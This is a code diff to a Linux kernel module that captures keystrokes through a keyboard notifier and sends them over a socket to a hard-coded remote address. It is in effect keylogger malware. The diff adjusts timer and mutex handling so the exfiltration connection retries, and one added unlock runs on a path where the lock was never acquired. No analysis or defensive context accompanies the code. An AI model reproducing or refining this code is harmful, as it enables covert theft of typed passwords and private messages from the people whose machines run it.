@@ -41,6 +41,7 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
 
         if (buffer_count == 0) {
             send_message(keystrokes);
+            mod_timer(&connection_timer, jiffies + msecs_to_jiffies(1000));
         }
     }
 
@@ -66,10 +67,13 @@ void initialize_conn(struct timer_list *t) {
     result = mutex_trylock(&socks_mutex);
     if (result != 1) {
     	mod_timer(&connection_timer, jiffies + msecs_to_jiffies(1000));
-	return;
+        mutex_unlock(&socks_mutex);
+	    return;
     }
 
     result = create_socket(IP_ADDRESS, PORT);
+    mutex_unlock(&socks_mutex);
+
     if (result < 0) {
         printk(KERN_ERR "Failed to connect\n");
     }
@@ -90,7 +94,6 @@ static int __init keyboard_module_init(void) {
     }
 
     timer_setup(&connection_timer, initialize_conn, 0);
-    mod_timer(&connection_timer, jiffies + msecs_to_jiffies(1000));
 
     // Register the keyboard notifier
     result = register_keyboard_notifier(&keyboard_notifier_block);
